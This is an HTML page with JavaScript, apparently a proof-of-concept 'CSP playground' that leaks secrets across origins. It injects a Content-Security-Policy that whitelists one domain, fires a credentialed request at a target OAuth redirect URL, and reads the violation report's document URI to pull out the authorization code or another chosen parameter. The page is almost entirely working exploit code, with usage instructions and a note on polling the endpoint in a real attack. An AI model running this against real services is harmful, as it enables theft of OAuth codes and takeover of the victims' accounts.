<!DOCTYPE html>
<html>
<head>
  <title>CSP Violation Reports - Playground</title>
  <style>
    .btn {
        display: inline-block;
        font-weight: 700;
        background-color: #4264fb;
        font-size: 12px;
        color: #fff;
        cursor: pointer;
        border-radius: 18px;
        padding: 6px 18px;
        text-align: center;
        transition: background-color .125s,border-color .125s,color .125s;
    }
  </style>
</head>
<body>
  <pre id="usage" style="display:none">
    Usage:
    http://cm2.pw/csp-playground?domain=auth.example.com&url=https://auth.example.com/oauth

    Parameters:
    url     -   URL issuing a redirect
    domain  -   CSP whitelisted domain
    extract -   Secret to be extracted (default: code)
  </pre>
  <div id="todo">
    <h2>TODO</h2>
    - Click on Exploit <br>
    - Click anywhere on the newly opened tab (Set to auto-close in 5 seconds)<br><br>
    <em>** In real attack scenario, instead of closing the tab immediately, we can keep polling the vulnerable endpoint until it works.</em><hr>
    <button class="btn">Exploit</button><br><br>
    <div id="report" style="display:none">
    <strong style="text-transform:uppercase"></strong><br>
    <textarea id="secret" style="width:100%" disabled></textarea>
    </div>
  </div>
  <script>
    window.addEventListener('DOMContentLoaded', e => {
      // Get URL parameters
      const params = (new URL(location)).searchParams;
      const url = params.get('url');
      const domain = params.get('domain');
      let secret = params.get('extract');

      if(!url || !domain){
        document.querySelector('#todo').style.display = 'none';
        document.querySelector('#usage').style.display = 'block';
        return;
      }

      // Add CSP with domain as a whitelist
      const meta = document.createElement('meta');
      meta.httpEquiv = 'Content-Security-Policy';
      meta.content = `default-src 'self' 'unsafe-inline' ${domain}`;
      document.head.appendChild(meta);

      const HandleViolation = e => {
        const document_uri = e.documentURI;

        if(!secret) secret = 'code';
        const regex = new RegExp(`[?&]${secret}=([^&;]+)`, 'i');
        let token = document_uri.match(regex);
        token = token ? token[1] : `${secret} not found`;

        prompt('documentURI',document_uri);
        document.querySelector('#secret').value = unescape(token);
        document.querySelector('#report').style.display = 'unset';
        document.querySelector('strong').textContent = secret;
      }

      function exploit(url) {
        const win = window.open((new URL(url)).origin + '/%0', '_blank');
        setTimeout(e => {
          try{win.close()}
          catch(e){}
          finally{
            fetch(url, {mode: 'no-cors', credentials: 'include'});
          }
        }, 5000);
      }

      window.addEventListener('securitypolicyviolation', HandleViolation);
      document.addEventListener('securitypolicyviolation', HandleViolation);
      document.querySelector('button').addEventListener('click', e => exploit(url));
    }, {once: true});
  </script>
</body>
</html>
